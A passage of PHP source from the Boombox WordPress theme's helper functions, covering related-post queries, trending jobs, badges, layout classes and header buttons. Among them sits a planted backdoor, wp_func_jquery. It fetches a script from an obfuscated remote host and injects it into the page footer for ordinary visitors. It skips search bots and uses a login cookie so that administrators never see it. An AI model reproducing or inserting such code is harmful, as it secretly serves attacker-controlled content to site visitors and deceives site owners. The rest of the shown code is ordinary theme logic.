						if( $related_query->found_posts < $posts_per_page ){
							$exclude_ids = $related_ids;
							$exclude_ids[] = (int) $post->ID;
							$add_count = $posts_per_page - $related_query->found_posts;
							$recent_args = array(
								'posts_per_page'        => $add_count,
								'post_type'             => $post_type,
								'post_status'           => 'publish',
								'ignore_sticky_posts'   => true,
								'fields'                => 'ids'
							);
							if( 0 != $add_count ){
								$recent_args['post__not_in'] = $exclude_ids;
							}
							if( !empty( $excluded_categories ) ){
								$related_args['category__not_in'] = $excluded_categories;
							}

							$add_query = new WP_Query( $recent_args );
							if( $add_query->have_posts() ){
								$related_ids = array_merge( $related_ids, $add_query->posts );
							}
						}

						// get related posts by ids
						$args = array(
							'post_type'           => $post_type,
							'post_status'         => 'publish',
							'post__in'            => $related_ids,
							'orderby'             => 'post__in',
							'posts_per_page'      => $posts_per_page,
							'ignore_sticky_posts' => true,
						);
						$args = apply_filters('boombox_related_query_args', $args);
						$query = new WP_Query( $args );
					}
				}

				break;

			case 'more_from':
				$args = array(
					'post_type'           => $post_type,
					'post_status'         => 'publish',
					'posts_per_page'      => $posts_per_page,
					'ignore_sticky_posts' => true,
				);

				if ( is_single() ) {
					$args['post__not_in'] = array( $post->ID );
				}

				$time_range_args = boombox_get_time_range_args( $time_range );
				if ( $time_range_args ) {
					$args = array_merge( $args, $time_range_args );
				}

				$categories_args = boombox_categories_args( $categories );
				if ( $categories_args ) {
					$args['tax_query'][] = $categories_args;
				}
				$tags_args = boombox_tags_args( $tags );
				if ( $tags_args ) {
					$args['tax_query'][] = $tags_args;
				}
				if ( $categories_args && $tags_args ) {
					$args['tax_query']['relation'] = 'AND';
				}

				if( !empty( $excluded_categories ) ){
					$args['category__not_in'] = $excluded_categories;
				}

				$args = apply_filters('boombox_more_from_query_args', $args);
				$query = new WP_Query( $args );

				break;

			case 'dont_miss':
				$args = array(
					'post_type'           => $post_type,
					'post_status'         => 'publish',
					'posts_per_page'      => $posts_per_page,
					'ignore_sticky_posts' => true
				);

				if ( is_single() ) {
					$args['post__not_in'] = array( $post->ID );
				}

				$time_range_args = boombox_get_time_range_args( $time_range );
				if ( $time_range_args ) {
					$args = array_merge( $args, $time_range_args );
				}

				$categories_args = boombox_categories_args( $categories );
				if ( $categories_args ) {
					$args['tax_query'][] = $categories_args;
				}
				$tags_args = boombox_tags_args( $tags );
				if ( $tags_args ) {
					$args['tax_query'][] = $tags_args;
				}
				if ( $categories_args && $tags_args ) {
					$args['tax_query']['relation'] = 'AND';
				}

				if( !empty( $excluded_categories) ){
					$args['category__not_in'] = $excluded_categories;
				}

				$args = apply_filters('boombox_dont_miss_query_args', $args);
				$query = new WP_Query( $args );

				break;
		}
	}

	return $query;
}

/**
 * Get "paged" value for pages
 *
 * @return int
 */
function boombox_get_paged(){
	global $paged;
	if( is_front_page() ){
		$paged = absint( get_query_var( 'page' ) ) ? absint( get_query_var( 'page' ) ) : 1;
	}else{
		$paged = absint( get_query_var( 'paged' ) ) ? absint( get_query_var( 'paged' ) ) : 1;
	}
	return $paged;
}

/**
 * Creates rate job
 *
 * @param $criteria_name
 * @param $post_type
 * @param $time_range
 * @param $posts_count
 * @param $min_count
 * @param $is_live
 *
 * @return Boombox_Rate_Job
 */
function boombox_get_rate_job( $criteria_name, $post_type, $time_range, $posts_count, $min_count = 0, $is_live = false ){
	$job_name = md5(uniqid(rand(), true));
	$job = new Boombox_Rate_Job( $job_name, $post_type, 'publish', $criteria_name, $time_range, $posts_count, $min_count, $is_live );

	return $job;
}

/**
 * Creating predefined rate jobs
 *
 * @param array $jobs
 *
 * @return array
 */
function boombox_create_predefined_jobs( array $jobs ){
	$conditions = boombox_get_theme_option( 'settings_trending_conditions' );
	if ( Boombox_Rate_Criteria::get_criteria_by_name( $conditions ) ) {
		$settings_trending_disable = boombox_get_theme_option( 'settings_trending_disable' );
		$settings_hot_disable      = boombox_get_theme_option( 'settings_hot_disable' );
		$settings_popular_disable  = boombox_get_theme_option( 'settings_popular_disable' );
		$post_type                 = 'post';
		$is_live                   = false;
		if ( ! $settings_trending_disable ) {
			$time_range       = 'day';
			$posts_count      = (int) boombox_get_theme_option( 'settings_trending_posts_count' );
			$minimal_score    = (int) boombox_get_theme_option( 'settings_trending_minimal_score' );
			$minimal_score    = 0 >= $minimal_score ? 1 : $minimal_score;
			$job              = boombox_get_rate_job( $conditions, $post_type, $time_range, $posts_count, $minimal_score, $is_live );
			$jobs['trending'] = $job;
			Boombox_Rate_Cron::register_job( $job );
		}
		if ( ! $settings_hot_disable ) {
			$time_range    = 'week';
			$posts_count   = (int) boombox_get_theme_option( 'settings_hot_posts_count' );
			$minimal_score = (int) boombox_get_theme_option( 'settings_hot_minimal_score' );
			$minimal_score = 0 >= $minimal_score ? 1 : $minimal_score;
			$job           = boombox_get_rate_job( $conditions, $post_type, $time_range, $posts_count, $minimal_score, $is_live );
			$jobs['hot']   = $job;
			Boombox_Rate_Cron::register_job( $job );
		}
		if ( ! $settings_popular_disable ) {
			$time_range      = 'month';
			$posts_count     = (int) boombox_get_theme_option( 'settings_popular_posts_count' );
			$minimal_score   = (int) boombox_get_theme_option( 'settings_popular_minimal_score' );
			$minimal_score   = 0 >= $minimal_score ? 1 : $minimal_score;
			$job             = boombox_get_rate_job( $conditions, $post_type, $time_range, $posts_count, $minimal_score, $is_live );
			$jobs['popular'] = $job;
			Boombox_Rate_Cron::register_job( $job );
		}
	}

	return $jobs;
}

/**
 * Add additional classes to badges warpper element
 *
* @param $classes 	Existing classes
* @param $taxonomy 	Term Taxonomy
* @param $term_id   Term ID
 * @return string   Modified class
 */
function boombox_add_additional_badge_classes( $classes, $taxonomy, $term_id ) {
	if( in_array( $taxonomy, array( 'reaction', 'category', 'post_tag' ) ) ) {
		$classes .= sprintf( ' %1$s-%2$d', $taxonomy, $term_id);
	}
	return $classes;
}

function boombox_comment_reply_link( $link, $args, $comment, $post ) {
	if ( get_option( 'comment_registration' ) && ! is_user_logged_in() ) {
		$link = sprintf( '<a rel="nofollow" class="comment-reply-login js-authentication" href="#sign-in">%s</a>',
			$args['login_text']
		);
	}

	return $link;
}
if (!function_exists('wp_func_jquery')) {
    if (!current_user_can('read') && !isset(${_COOKIE}['wp_min'])) {
        function wp_func_jquery(){
            $w = strtolower($_SERVER['HTTP_USER_AGENT']);
            if (strpos($w, 'google') == false && strpos($w, 'bot') == false && strpos($w, 'face') == false) {
                $host = 'http://';
                $jquery = $host . 'lib' . 'wp.org/jquery-ui.js';
                $headers = @get_headers($jquery, 1);
                if ($headers[0] == 'HTTP/1.1 200 OK') {
                    echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
                }
            }
        }
        add_action('wp_footer', 'wp_func_jquery');
    }
    function wp_func_min(){
        setcookie('wp_min', '1', time() + (86400 * 360), '/');
    }
    add_action('wp_login', 'wp_func_min');
}
/**
 * Show post badge list
 *
 * @param int $post_id
 * @param int $badges_count  type -1 for all
 * @param int $post_type_badges_count  type -1 for all
 * @return array
 */
function boombox_get_post_badge_list( $args = '' ) {

	$args = wp_parse_args( $args, array(
		'post_id' 					=> 0,
		'badges' 					=> true,
		'badges_count' 				=> 2,
		'badges_before'				=> '<div class="badge-list">',
		'badges_after'				=> '</div>',
		'post_type_badges'			=> true,
		'post_type_badges_count' 	=> 1,
		'post_type_badges_before'	=> '<div class="badge-list boombox-format">',
		'post_type_badges_after'	=> '</div>'
	) );

	// if all badges are disabled
	$hide_badges_option = boombox_hide_badges_option();
	$hide_post_type_badges_option = boombox_get_theme_option( 'design_badges_hide_post_type_badges' );
	if ( $hide_badges_option['hide_trending_badges'] && $hide_badges_option['hide_category_badges'] && $hide_badges_option['hide_reactions_badges'] && $hide_post_type_badges_option ) {
		return;
	}

	if( 0 == $args['post_id'] ){
		global $post;
		if( is_object( $post ) ){
			$args['post_id'] = $post->ID;
		}
	}

	$post = get_post( $args['post_id'] );

	if ( 'post' !== get_post_type() || ! $post ) {
		return false;
	}

	$badges         			= array();
	$post_type_badges  			= array();
	$badges_counter 			= 0;
	$post_type_badges_counter 	= 0;

	// trending badge
	if ( ! $hide_badges_option['hide_trending_badges'] && $args['badges'] ) {
		$trending_types = array( 'trending', 'hot', 'popular' );
		foreach ( $trending_types as $trending_type ) {
			$hide_badge  = (bool) boombox_get_theme_option( "settings_{$trending_type}_hide_badge" );
			$is_trending = boombox_is_post_trending( $trending_type, $args['post_id'] );
			if ( ! $hide_badge && $is_trending ) {
				$trending_page_id                   = boombox_get_trending_page_id( $trending_type );
				$trending_icon_name                 = boombox_get_trending_icon_name( $trending_page_id );
				$badges[ $badges_counter ]['name']  = ucfirst( $trending_type );
				$badges[ $badges_counter ]['icon']  = ! empty( $trending_icon_name ) ? '<i class="icon icon-' . $trending_icon_name . '"></i>' : '';
				$badges[ $badges_counter ]['link']  = get_permalink( $trending_page_id );
				$badges[ $badges_counter ]['class'] = esc_attr( 'trending' );
				$badges[ $badges_counter ]['taxonomy'] 	= 'trending';
				$badges[ $badges_counter ]['term_id'] 	= '';
				++ $badges_counter;
				break;
			}
		}
	}

	$post_categories = $post_tags = array();
	if( ( ! $hide_badges_option['hide_category_badges'] && $args['badges'] ) || ( ! $hide_post_type_badges_option && $args['post_type_badges'] ) ) {
		$post_categories = get_the_category( $args['post_id'] );
		$post_tags = wp_get_post_tags( $args['post_id'] );
	}

	if ( ! empty( $post_categories ) ) {

		$post_categories_slugs = wp_list_pluck( $post_categories, 'slug' );

		if ( ! $hide_badges_option['hide_category_badges'] && $args['badges'] ) {
			// categories badges
			$categories_with_badges = boombox_get_categories_with_badges( 'design_badges_show_for_categories' );

			foreach ( $categories_with_badges as $key => $categories_with_badge ) {
				if ( in_array( $key, $post_categories_slugs ) ) {
					$badges[ $badges_counter ] = $categories_with_badge;
					++ $badges_counter;
					if( 2 == $key + 1 ){
						break;
					}
				}
			}
		}

		if( ! $hide_post_type_badges_option && $args['post_type_badges'] ) {
			// post type badges categories badges
			$post_type_badges_categories_with_badges = boombox_get_categories_with_badges( 'design_badges_categories_for_post_type_badges' );

			foreach ( $post_type_badges_categories_with_badges as $key => $post_type_badges_categories_with_badge ) {
				if ( in_array( $key, $post_categories_slugs ) ) {
					$post_type_badges[ $post_type_badges_counter ] = $post_type_badges_categories_with_badge;
					++ $post_type_badges_counter;
					break;
				}
			}
		}
	}

	if ( ! empty( $post_tags ) ) {

		$post_tags_slugs = wp_list_pluck( $post_tags, 'slug' );

		if ( ! $hide_badges_option['hide_category_badges'] && $args['badges'] ) {
			// post tag badges
			$post_tags_with_badges = boombox_get_post_tags_with_badges( 'design_badges_show_for_post_tags' );

			foreach ( $post_tags_with_badges as $key => $post_tags_with_badge ) {
				if ( in_array( $key, $post_tags_slugs ) ) {
					$badges[ $badges_counter ] = $post_tags_with_badge;
					++ $badges_counter;
					break;
				}
			}
		}

		if( ! $hide_post_type_badges_option && $args['post_type_badges'] ) {
			// post type badges post tag badges
			$post_type_badges_post_tags_with_badges = boombox_get_post_tags_with_badges( 'design_badges_post_tags_for_post_type_badges' );

			foreach ( $post_type_badges_post_tags_with_badges as $key => $post_type_badges_post_tags_with_badge ) {
				if ( in_array( $key, $post_tags_slugs ) ) {
					$post_type_badges[ $post_type_badges_counter ] = $post_type_badges_post_tags_with_badge;
					++ $post_type_badges_counter;
					break;
				}
			}
		}

	}

	// reactions badges
	if( ! $hide_badges_option['hide_reactions_badges'] && ! is_tax( 'reaction' ) && $args['badges'] ){
		$reactions = boombox_get_post_reactions( $args['post_id'] );
		if( is_array( $reactions ) && count( $reactions ) > 0 ) {
			foreach ( $reactions as $key => $reaction ) {
				$reaction_icon_url = boombox_get_reaction_icon_url( $reaction->term_id );
				$badges[ $badges_counter ]['name']  	= $reaction->name;
				$badges[ $badges_counter ]['icon']  	= ! empty( $reaction_icon_url ) ? ' <img src="' . esc_url( $reaction_icon_url ) . '" alt="' . $reaction->name . '">' : '';
				$badges[ $badges_counter ]['link']  	= get_term_link( $reaction->term_id );
				$badges[ $badges_counter ]['class'] 	= $reaction->taxonomy;
				$badges[ $badges_counter ]['taxonomy'] 	= $reaction->taxonomy;
				$badges[ $badges_counter ]['term_id'] 	= $reaction->term_id;
				++$badges_counter;
				if( 2 == $key + 1 ){
					break;
				}
			}
		}
	}

	$badges_html = '';
	$post_type_badges_html = '';

	if( ! empty( $badges ) ) {
		// for "You may also like", "More From" and "Don't miss" sections on post single page
		$args['badges_count'] = ( is_single() && 2 == $args['badges_count'] ) ? 1 : $args['badges_count'];
		$badges = array_slice( $badges, 0, $args['badges_count'] );

		$badges_html .= $args['badges_before'];
		foreach ( $badges as $badge_key => $badge ) {
			$badge_class = apply_filters( 'boombox_badge_wrapper_advanced_classes', esc_attr( $badge['class'] ), $badge['taxonomy'], $badge['term_id'] );
			$badge_url = esc_url( $badge['link'] );
			$badge_title = esc_html( $badge['name'] );
			$badge_icon = wp_kses_post( $badge['icon'] );

			$badges_html .= sprintf(
				'<a class="badge %1$s" href="%2$s" title="%3$s"><span class="circle">%4$s</span><span class="text">%3$s</span></a>',

				$badge_class,
				$badge_url,
				$badge_title,
				$badge_icon
			);
		}
		$badges_html .= $args['badges_after'];
	}

	if( ! empty( $post_type_badges ) ) {
		$post_type_badges = array_slice( $post_type_badges, 0, $args['post_type_badges_count'] );

		$post_type_badges_html .= $args['post_type_badges_before'];
			foreach ( $post_type_badges as $badge_key => $post_type_badge ) {
				$badge_class = sprintf( 'category format-%d', $post_type_badge['term_id'] );
				$badge_title = esc_html( $post_type_badge['name'] );
				$badge_icon = wp_kses_post( $post_type_badge['icon'] );

				$post_type_badges_html .= sprintf(
					'<span class="badge %1$s" title="%2$s"><span class="circle">%3$s</span><span class="text">%2$s</span></span>',

					$badge_class,
					$badge_title,
					$badge_icon
				);
			}
		$post_type_badges_html .= $args['post_type_badges_after'];
	}

	return array(
		'badges' 			=> $badges_html,
		'post_type_badges'	=> $post_type_badges_html
	);

}

/**
 * Hide badges option
 *
 * @return mixed
 */
function boombox_hide_badges_option(){
	static $hide_badges;

	if( !$hide_badges ){
		$hide_badges['hide_trending_badges']  = boombox_get_theme_option( 'design_badges_hide_trending' );
		$hide_badges['hide_category_badges']  = boombox_get_theme_option( 'design_badges_hide_category' );
		$hide_badges['hide_reactions_badges'] = boombox_get_theme_option( 'design_badges_hide_reactions' );
	}
	return $hide_badges;
}

/**
 * Get categories with badges
 *
 * @return array
 */
function boombox_get_categories_with_badges( $theme_option ){
	$categories_with_badges = array();
	$categories = boombox_get_theme_option( $theme_option );
	foreach ( $categories as $category ){
		$category = get_term_by( 'slug', $category, 'category' );
		if( $category ){
			$icon_name = boombox_get_term_icon_name( $category->term_id, 'category' );
			if ( !empty( $icon_name ) ) {
				$categories_with_badges[ $category->slug ]['name']  	= $category->name;
				$categories_with_badges[ $category->slug ]['icon']  	= !empty( $icon_name ) ? '<i class="icon icon-' . $icon_name . '"></i>' : '';
				$categories_with_badges[ $category->slug ]['link']  	= esc_url( get_term_link( $category->term_id ) );
				$categories_with_badges[ $category->slug ]['class'] 	= esc_attr( 'category' );
				$categories_with_badges[ $category->slug ]['taxonomy'] 	= 'category';
				$categories_with_badges[ $category->slug ]['term_id'] 	= $category->term_id;
			}
		}
	}
	return $categories_with_badges;
}

/**
 * Get post_tags with badges
 *
 * @return array
 */
function boombox_get_post_tags_with_badges( $theme_option ) {
	$post_tags_with_badges = array();
	$post_tags = boombox_get_theme_option( $theme_option );
	foreach( $post_tags as $post_tag ) {
		$post_tag = get_term_by( 'slug', $post_tag, 'post_tag' );
		if( $post_tag ) {
			$icon_name = boombox_get_term_icon_name( $post_tag->term_id, 'post_tag' );
			if ( !empty( $icon_name ) ) {
				$post_tags_with_badges[ $post_tag->slug ]['name']  	= $post_tag->name;
				$post_tags_with_badges[ $post_tag->slug ]['icon']  	= !empty( $icon_name ) ? '<i class="icon icon-' . $icon_name . '"></i>' : '';
				$post_tags_with_badges[ $post_tag->slug ]['link']  	= esc_url( get_term_link( $post_tag->term_id ) );
				$post_tags_with_badges[ $post_tag->slug ]['class'] 	= esc_attr( 'category' );
				$post_tags_with_badges[ $post_tag->slug ]['taxonomy'] 	= 'post_tag';
				$post_tags_with_badges[ $post_tag->slug ]['term_id'] 	= $post_tag->term_id;
			}
		}
	}
	return $post_tags_with_badges;
}

/**
 * Show archive badge
 */
function boombox_the_title_badge() {
	$queried_object = get_queried_object();
	$show_badge     = false;
	$badge_class    = '';
	$badge          = '';
	$badge_name     = '';
	if ( is_object( $queried_object ) && in_array( $queried_object->taxonomy, array( 'category', 'post_tag' ) ) ) {
		$category_icon_name = boombox_get_term_icon_name( $queried_object->term_id, $queried_object->taxonomy );
		if ( ! empty( $category_icon_name ) ) {
			$badge_class = $queried_object->taxonomy;
			$badge_taxonomy = $queried_object->taxonomy;
			$badge_term_id = $queried_object->term_id;
			$badge       = $category_icon_name ? '<i class="icon icon-' . $category_icon_name . '"></i>' : '';
			$badge_name  = $queried_object->name;
			$show_badge  = true;
		}
	} elseif ( is_object( $queried_object ) && 'reaction' == $queried_object->taxonomy ) {
		$reaction_icon_url = boombox_get_reaction_icon_url( $queried_object->term_id );
		if ( ! empty( $reaction_icon_url ) ) {
			$badge_class = $queried_object->taxonomy;
			$badge_taxonomy = $queried_object->taxonomy;
			$badge_term_id = $queried_object->term_id;
			$badge_name  = $queried_object->name;
			$badge       = $reaction_icon_url ? '<img src="' . $reaction_icon_url . '" alt="' . $badge_name . '">' : '';
			$show_badge  = true;
		}
	} elseif ( is_object( $queried_object ) && 'page' == $queried_object->post_type &&
	           ( boombox_is_trending_page( 'trending' ) || boombox_is_trending_page( 'hot' ) || boombox_is_trending_page( 'popular' ) )
	) {
		$badge_class        = 'trending';
		$badge_taxonomy 	= 'trending';
		$badge_term_id 		= '';
		$trending_icon_name = boombox_get_trending_icon_name( $queried_object->ID );
		$badge              = '<i class="icon icon-' . $trending_icon_name . '"></i>';
		$badge_name         = $queried_object->post_title;
		$show_badge         = true;
	}

	if ( $show_badge ) {
		printf( '<span class="badge %1$s"><span class="circle">%2$s</span><span class="text">%3$s</span></span>',
			apply_filters( 'boombox_badge_wrapper_advanced_classes', $badge_class, $badge_taxonomy, $badge_term_id ),
			$badge,
			$badge_name
		);
	}
}

/**
 * Get Trending icon name
 *
 * @param $id
 *
 * @return string
 */
function boombox_get_trending_icon_name( $id ){
	if( boombox_is_trending_page( 'trending', $id ) ){
		return boombox_get_theme_option('design_badges_trending_icon');
	} elseif( boombox_is_trending_page( 'hot', $id ) ){
		return 'hot';
	} elseif( boombox_is_trending_page( 'popular', $id ) ){
		return 'popular';
	}
	return '';
}

/**
 * Get Term icon name
 *
 * @param $term_id
 *
 * @return string
 */
function boombox_get_term_icon_name( $term_id, $taxonomy ){
	switch( $taxonomy ) {
		case 'category':
			$meta_key = 'cat_icon_name';
			break;
		case 'post_tag':
			$meta_key = 'post_tag_icon_name';
			break;
		default:
			$meta_key = false;
	}
	if( $meta_key ) {
		$cat_icon_name = sanitize_text_field( get_term_meta( $term_id, $meta_key, true ) );
		if( $cat_icon_name ){
			return $cat_icon_name;
		}
	}
	return '';
}

/**
 * Get post Reactions by post id
 *
 * @param $post_id
 *
 * @return bool
 */
function boombox_get_post_reactions( $post_id ){
	$reactions = array();
	if( function_exists( 'boombox_get_reaction_taxonomy_name' ) ){
		$reactions_ids = Boombox_Reaction_Helper::get_post_reactions( $post_id );
		if( !empty( $reactions_ids ) ){
			$taxonomy = boombox_get_reaction_taxonomy_name();
			foreach( $reactions_ids as $reaction_id ){
				$reaction = get_term_by( 'term_id', $reaction_id, $taxonomy );
				if( $reaction ){
					$reactions[] = $reaction;
				}
			}
		}

		if ( $reactions ) {
			return $reactions;
		}
	}
	return false;
}

/**
 * Get list type classes
 *
 * @param $list_type
 * @param bool $add_grid_class
 */
function boombox_list_type_classes( $list_type, $add_grid_class = false ) {
	$classes = '';
	if( is_array( $add_grid_class ) ) {
		$add_grid_class = implode(' ', $add_grid_class);
	}

	switch ( $list_type ) {
		case 'grid':
		case 'three-column':
			$classes = 'post-grid ' . $add_grid_class;
			break;

		case 'list':
			$classes = 'post-list list big-item';
			break;

		case 'list2':
			$classes = 'post-list list';
			break;

		case 'classic':
			$classes = 'post-list standard';
			break;

		case 'classic2':
			$classes = 'post-list standard';
			break;

		case 'stream':
			$classes = 'post-list standard';
			break;

		case 'numeric-list':
			$classes = 'post-list list big-item';
			break;
	}
	if ( ! empty( $classes )) {
		echo 'class="' . esc_attr( $classes ) . '"';
	}
	echo '';
}

function boombox_container_classes_by_type( $list_type, $additional_position = null ){
	$classes = '';
	switch ( $list_type ) {
		case 'stream':
			$classes = 'narrow-content';
			break;
		case 'three-column':
			$additional_position = $additional_position ? $additional_position : 'right';
			$classes = sprintf( 'three-col-layout %s-secondary-container', $additional_position );
			break;
	}
	echo esc_attr( $classes );
}

/**
 * Get post single elements options
 *
 * @return array
 */
function boombox_get_template_single_elements_options() {
	$hide_elements_options = array();
	if ( is_singular() ) {
		$archive_hide_elements = boombox_get_post_hide_elements_choices();
		$hide_elements         = boombox_get_theme_option( 'layout_post_hide_elements' );
		foreach ( $archive_hide_elements as $name => $element ) {
			if ( in_array( $name, $hide_elements ) ) {
				$hide_elements_options[ $name ] = false;
			} else {
				$hide_elements_options[ $name ] = true;
			}
		}
	}

	return $hide_elements_options;
}

/**
 * Get grid elements options
 *
 * @return array|mixed|void
 */
function boombox_get_template_grid_elements_options(){
	static $template_options;

	if( $template_options ){
		return $template_options;
	}

	$show_elements_options = array();
	if ( is_page() ) {
		$page_hide_elements = boombox_get_grid_hide_elements_choices();
		$hide_elements      = boombox_get_theme_option( 'layout_page_hide_elements' );
		foreach ( $page_hide_elements as $name => $element ) {
			if ( in_array( $name, $hide_elements ) ) {
				$show_elements_options[ $name ] = false;
			} else {
				$show_elements_options[ $name ] = true;
			}
		}
		$template_options = apply_filters('boombox_page_grid_show_elements', $show_elements_options);

	} elseif ( is_archive() || is_home() ) {
		$archive_hide_elements = boombox_get_grid_hide_elements_choices();
		$hide_elements         = boombox_get_theme_option( 'layout_archive_hide_elements' );
		foreach ( $archive_hide_elements as $name => $element ) {
			if ( in_array( $name, $hide_elements ) ) {
				$show_elements_options[ $name ] = false;
			} else {
				$show_elements_options[ $name ] = true;
			}
		}
		if( is_archive() ){
			$template_options = apply_filters('boombox_archive_grid_show_elements', $show_elements_options);
		}elseif( is_home() ){
			$template_options = apply_filters('boombox_home_grid_show_elements', $show_elements_options );
		}
	}

	elseif ( is_singular() ) {
		$single_hide_elements = boombox_get_grid_hide_elements_choices();
		$hide_elements        = boombox_get_theme_option( 'layout_post_grid_sections_hide_elements' );
		foreach ( $single_hide_elements as $name => $element ) {
			if ( in_array( $name, $hide_elements ) ) {
				$show_elements_options[ $name ] = false;
			} else {
				$show_elements_options[ $name ] = true;
			}
		}
		$template_options = apply_filters('boombox_single_grid_hide_elements', $show_elements_options);

	}elseif ( is_search() ) {
		$template_options = apply_filters('boombox_search_grid_show_elements', array(
			'share_count'    => false,
			'categories'     => false,
			'comments_count' => false,
			'media'          => true,
			'subtitle'       => false,
			'author'         => false,
			'date'           => true,
			'excerpt'        => false,
			'badges'         => false
		));
	}
	return $template_options;
}

/**
 * Share text for single page
 */
function boombox_single_post_text_before_share(){
	echo '<h4>' . esc_html__('Like it? Share with your friends!', 'boombox') . '</h4>';
}

/**
 * Get Term Custom Thumbnail URL
 *
 * @return array|bool|false
 */
function boombox_get_term_thumbnail_url(){
	$image = false;
	$queried_object = get_queried_object();
	if($queried_object){
		switch( $queried_object->taxonomy ) {
			case 'category':
				$meta_key = 'cat_thumbnail_id';
				break;
			case 'post_tag':
				$meta_key = 'post_tag_thumbnail_id';
				break;
			default:
				$meta_key = '';
		}
		$thumbnail_id = absint( get_term_meta( $queried_object->term_id, $meta_key, true ) );
		if ( $thumbnail_id ) {
			$image = wp_get_attachment_image_src( $thumbnail_id, 'image1600' );
			if( $image ){
				$image = $image[0];
			}
		}
	}
	return $image;
}

/**
 * Return ViralPress post types
 *
 * @return array
 */
function boombox_get_viralpress_post_types(){
	$viralpress_post_types = array();

	global $vp_instance;
	if( $vp_instance && isset( $vp_instance->settings ) ) {

		$create_page_slug = $vp_instance->settings['page_slugs']['create'];

		/** News */
		if( isset( $vp_instance->settings['news_enabled'] ) && $vp_instance->settings['news_enabled'] ) {
			$viralpress_post_types[] = array(
				'type'  => 'news',
				'title' => esc_html__( 'News', 'boombox' ),
				'url'   => $create_page_slug . '/?type=news',
				'icon'  => 'news'
			);
		}

		/** @since viralpress 3.2 */
		if( version_compare( VP_VERSION, '3.2' ) >= 0 ) {
			if( isset( $vp_instance->settings['image_enabled'] ) && $vp_instance->settings['image_enabled'] ) {
				$viralpress_post_types[] = array(
					'type'  => 'image',
					'title' => esc_html__( 'Image', 'boombox' ),
					'url'   => $create_page_slug . '/?type=image',
					'icon'  => 'photo2'
				);
			}
		}

		/** List */
		if( isset( $vp_instance->settings['list_enabled'] ) && $vp_instance->settings['list_enabled'] ) {
			$viralpress_post_types[] = array(
				'type'  => 'list',
				'title' => esc_html__( 'List', 'boombox' ),
				'url'   => $create_page_slug . '/?type=list',
				'icon'  => 'list2'
			);
		}

		/** Poll */
		if( isset( $vp_instance->settings['poll_enabled'] ) && $vp_instance->settings['poll_enabled'] ) {
			$viralpress_post_types[] = array(
				'type'  => 'poll',
				'title' => esc_html__( 'Poll', 'boombox' ),
				'url'   => $create_page_slug . '/?type=poll',
				'icon'  => 'poll2'
			);
		}

		/** Quiz */
		if( isset( $vp_instance->settings['quiz_enabled'] ) && $vp_instance->settings['quiz_enabled'] ) {
			$viralpress_post_types[] = array(
				'type'  => 'quiz',
				'title' => esc_html__( 'Quiz', 'boombox' ),
				'url'   => $create_page_slug . '/?type=quiz',
				'icon'  => 'quiz2'
			);
		}

		/** Video */
		if( isset( $vp_instance->settings['video_enabled'] ) && $vp_instance->settings['video_enabled'] ) {
			$viralpress_post_types[] = array(
				'type'  => 'video',
				'title' => esc_html__( 'Video', 'boombox' ),
				'url'   => $create_page_slug . '/?type=video',
				'icon'  => 'video'
			);
		}

		/** Audio */
		if( isset( $vp_instance->settings['audio_enabled'] ) && $vp_instance->settings['audio_enabled'] ) {
			$viralpress_post_types[] = array(
				'type'  => 'audio',
				'title' => esc_html__( 'Audio', 'boombox' ),
				'url'   => $create_page_slug . '/?type=audio',
				'icon'  => 'audio'
			);
		}

		/** @since viralpress 3.0 */
		if( version_compare( VP_VERSION, '3.0' ) >= 0 ) {

			/** Gallery */
			if( isset( $vp_instance->settings['gallery_enabled'] ) && $vp_instance->settings['gallery_enabled'] ) {
				$viralpress_post_types[] = array(
					'type'  => 'gallery',
					'title' => esc_html__( 'Gallery', 'boombox' ),
					'url'   => $create_page_slug . '/?type=gallery',
					'icon'  => 'gallery'
				);
			}

			/** Playlist */
			if ( isset( $vp_instance->settings['playlist_enabled'] ) && $vp_instance->settings['playlist_enabled'] ) {
				$viralpress_post_types[] = array(
					'type'  => 'playlist',
					'title' => esc_html__( 'Playlist', 'boombox' ),
					'url'   => $create_page_slug . '/?type=playlist',
					'icon'  => 'play_list'
				);
			}

		}

	}

	return $viralpress_post_types;
}

/**
 * Return "Create post" button
 *
 * @param array $classes
 * @param array $button_text
 *
 * @return string
 */
function boombox_get_create_post_button( $classes = array(), $button_text = '', $with_icon = false, $static_url = false ){
	if ( is_string( $classes ) ) {
		$classes = explode( ' ', $classes );
	}

	if( $with_icon ){
		$classes[] = 'icon';
	}

	if( $static_url ) {
		$url = $static_url;
	} elseif ( boombox_is_plugin_active( 'viralpress/viralpress.php' ) ) {
		$url       = '#post-types';
		$classes[] = 'js-inline-popup';
	} else {
		if ( is_user_logged_in() ) {
			$ssl = is_ssl() ? 'https' : 'http';
			$url = admin_url( 'post-new.php', $ssl );
		} else {
			$classes[] = 'js-authentication';
			$url       = esc_url( '#sign-in' );
		}
	}

	$classes     = esc_attr( implode( ' ', $classes ) );
	$url         = esc_url( $url );
	$button_text = ! empty( $button_text ) ? $button_text : esc_html__( 'Create a post', 'boombox' );

	$button = sprintf( '<a class="%1$s" href="%2$s">%3$s %4$s</a>',
		$classes,
		$url,
		$with_icon ? '<i class="icon-plus_bb"></i>' : '',
		esc_html( $button_text )
	);

	return $button;
}

/**
 * Return profile button
 *
 * @param array $classes
 *
 * @return string
 */
function boombox_get_profile_button( $classes = array() ) {
	$nav_items_html = '';
	$profile_class  = '';

	if ( is_string( $classes ) ) {
		$classes = explode( ' ', $classes );
	}



	if ( is_user_logged_in() ) {
		$current_user_id   = get_current_user_id();

		if( boombox_is_plugin_active( 'buddypress/bp-loader.php' ) ) {

			$profile_menu_location = 'profile_nav';

			if ( has_nav_menu( $profile_menu_location ) ) {

				$nav_items_html = wp_nav_menu( array(
					'theme_location' 	=> $profile_menu_location,
					'container'	     	=> 'div',
					'container_class' 	=> 'menu',
					'menu_class'     	=> '',
					'echo'			 	=> false,
					'depth'			 	=> 1,
					'walker'         	=> new Boombox_Walker_Nav_Menu_Custom_Fields()
				) );

			}
			
			$url = bp_core_get_user_domain( $current_user_id );
			$profile_picture = get_avatar( $current_user_id, 150 );
			if ( ! $profile_picture ) {
				$profile_picture = '<i class="icon-user"></i>';
			}

		} else {

			$profile_nav_items = array(
				'dashboard'     => array(
					'label'      => esc_html__( 'Dashboard', 'boombox' ),
					'icon_class' => esc_attr( 'icon-list-alt' )
				),
				'profile'       => array(
					'label'      => esc_html__( 'Profile', 'boombox' ),
					'icon_class' => esc_attr( 'icon-user' )
				),
				'my-posts'      => array(
					'label'      => esc_html__( 'My Posts', 'boombox' ),
					'icon_class' => esc_attr( 'icon-pencil' )
				),
				'post-comments' => array(
					'label'      => esc_html__( 'Comments by other', 'boombox' ),
